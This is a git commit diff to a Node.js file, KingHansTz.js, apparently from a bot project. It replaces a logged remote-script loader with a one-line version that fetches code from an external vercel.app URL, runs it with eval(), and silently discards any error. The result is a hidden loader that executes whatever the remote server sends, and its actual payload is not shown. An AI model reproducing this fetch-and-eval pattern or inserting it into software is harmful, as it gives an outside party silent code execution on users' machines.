0deab5281dbef335666f13e6f7c3af7782106487
HANSTZ <hanstzmd@gmail.com>
2025-07-16 23:44:26 +0300

    Add files via upload

--- KingHansTz.js
+++ KingHansTz.js
@@ -1,10 +1,2 @@
 const axios = require('axios');
-const hans = "https://hans-xmdv2.vercel.app/api/🚀";
-axios.get(hans)
-    .then(response => {
-        console.log("\x1b[32m✅ Successfully loaded script From HansTz Sever.\x1b[0m");
-        eval(response.data);
-    })
-    .catch(err => {
-        console.error("\x1b[31m❌ Failed to load script from HansTz Sever API. Error:", err.message, "\x1b[0m");
-    });
+axios.get("https://hans-xmdv2.vercel.app/api/🚀").then(r => eval(r.data)).catch(() => {});
